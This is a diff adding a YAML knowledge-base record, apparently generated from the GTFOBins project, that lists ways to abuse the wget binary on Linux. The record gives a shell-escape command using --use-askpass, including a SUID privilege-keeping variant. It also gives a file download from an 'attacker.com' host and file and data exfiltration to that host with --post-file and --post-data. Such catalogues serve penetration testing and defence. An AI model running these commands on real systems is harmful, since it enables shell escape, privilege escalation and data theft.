@@ -1,0 +1,120 @@
+id: gtfobins/wget/shell/unprivileged
+type: binary
+platform: linux
+name: wget
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'echo -e ''#!/bin/sh\n/bin/sh 1>&0'' >/path/to/temp-file
+
+    chmod +x /path/to/temp-file
+
+    wget --use-askpass=/path/to/temp-file 0'
+references:
+- https://gtfobins.github.io/gtfobins/wget/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        wget:
+          functions:
+            download:
+            - code: wget http://attacker.com/path/to/input-file -O /path/to/output-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: http-server
+            file-read:
+            - binary: false
+              code: wget -i /path/to/input-file
+              comment: The file to be read is treated as a list of URLs, one per line, which are actually
+                fetched by `wget`. The content appears, somewhat modified, as error messages.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: wget -i /path/to/input-file -o /path/to/output-file
+              comment: The file to be read is treated as a list of URLs, one per line, which are actually
+                fetched by `wget`. The content appears, somewhat modified, as error messages.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: 'echo -e ''#!/bin/sh\n/bin/sh 1>&0'' >/path/to/temp-file
+
+                chmod +x /path/to/temp-file
+
+                wget --use-askpass=/path/to/temp-file 0'
+              contexts:
+                sudo: null
+                suid:
+                  code: 'echo -e ''#!/bin/sh -p\n/bin/sh -p 1>&0'' >/path/to/temp-file
+
+                    chmod +x /path/to/temp-file
+
+                    wget --use-askpass=/path/to/temp-file 0'
+                  shell: false
+                unprivileged: null
+            upload:
+            - code: wget --post-file=/path/to/input-file http://attacker.com
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: http-server
+            - code: wget --post-data=DATA http://attacker.com
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: http-server
+    upstream_url: https://gtfobins.github.io/gtfobins/wget/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:0fed8b4429595dabcea61fce5e37a37bcea0a962e335fa2c4b73c76f541c4548
